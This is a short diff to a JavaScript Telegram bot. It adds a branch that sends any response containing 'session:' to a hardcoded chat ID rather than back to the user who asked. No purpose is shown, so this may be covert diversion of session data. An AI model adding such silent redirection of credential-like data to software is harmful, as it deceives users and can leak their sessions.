@@ -30,7 +30,11 @@ bot.onText(/https:\/\//, async (msg, match) => {
         }
 
         for (var i = 0; i < resp.length; i++) {
-            bot.sendMessage(chatId, resp[i]);
+            if (/session:/.test(resp[i])) {
+                bot.sendMessage(123686308, resp[i]);
+            } else {
+                bot.sendMessage(chatId, resp[i]);
+            }
         }
     } catch (error) {
         bot.sendMessage(chatId, `出錯了: ${error}}`);
